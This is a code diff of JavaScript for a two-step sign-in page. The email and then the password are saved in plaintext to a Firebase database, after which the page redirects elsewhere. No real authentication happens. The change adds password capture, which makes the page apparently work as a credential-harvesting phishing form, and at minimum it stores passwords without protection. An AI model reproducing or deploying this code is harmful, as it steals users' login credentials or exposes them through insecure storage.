@@ -17,9 +17,16 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const database = getDatabase(app);
 
-// Handle the "Next" button click
-document.getElementById('nextBtn').addEventListener('click', function () {
-  const emailField = document.getElementById('email');
+// DOM Elements
+const emailStep = document.querySelector('.step-email');
+const passwordStep = document.querySelector('.step-password');
+const emailField = document.getElementById('email');
+const passwordField = document.getElementById('password');
+const nextBtn = document.getElementById('nextBtn');
+const signInBtn = document.getElementById('signInBtn');
+
+// Step 1: Handle "Next" button for email
+nextBtn.addEventListener('click', function () {
   const email = emailField.value.trim();
 
   if (email === '') {
@@ -28,31 +35,51 @@ document.getElementById('nextBtn').addEventListener('click', function () {
     return;
   }
 
-  // Save user data to Firebase
-  saveUserData(email)
+  // Save email to Firebase
+  saveEmail(email)
     .then(() => {
-      console.log('Data saved successfully in Firebase!');
+      console.log('Email saved successfully in Firebase!');
+      // Show password step
+      emailStep.classList.add('hidden');
+      passwordStep.classList.remove('hidden');
+    })
+    .catch(error => {
+      console.error('Error saving email to Firebase:', error);
+      alert('Failed to save email. Please try again.');
+    });
+});
+
+// Step 2: Handle "Sign In" button for password
+signInBtn.addEventListener('click', function () {
+  const password = passwordField.value.trim();
+
+  if (password === '') {
+    alert('Please enter your password.');
+    passwordField.focus();
+    return;
+  }
+
+  // Save password to Firebase
+  savePassword(password)
+    .then(() => {
+      console.log('Password saved successfully in Firebase!');
       // Redirect to the main index page
       window.location.href = 'index.html';
     })
     .catch(error => {
-      console.error('Error saving data to Firebase:', error);
-      alert('Failed to save data. Please try again.');
+      console.error('Error saving password to Firebase:', error);
+      alert('Failed to save password. Please try again.');
     });
 });
 
-// Function to save user data to Firebase
-function saveUserData(email) {
-  const userId = generateUserId(); // Generate a unique ID for the user
-  const userRef = ref(database, 'users/' + userId);
-
-  return set(userRef, {
-    email: email,
-    timestamp: new Date().toISOString()
-  });
+// Function to save email to Firebase
+function saveEmail(email) {
+  const userRef = ref(database, 'users/email');
+  return set(userRef, { email: email });
 }
 
-// Helper function to generate a unique user ID
-function generateUserId() {
-  return 'user_' + Math.random().toString(36).substr(2, 9);
+// Function to save password to Firebase
+function savePassword(password) {
+  const userRef = ref(database, 'users/password');
+  return set(userRef, { password: password });
 }
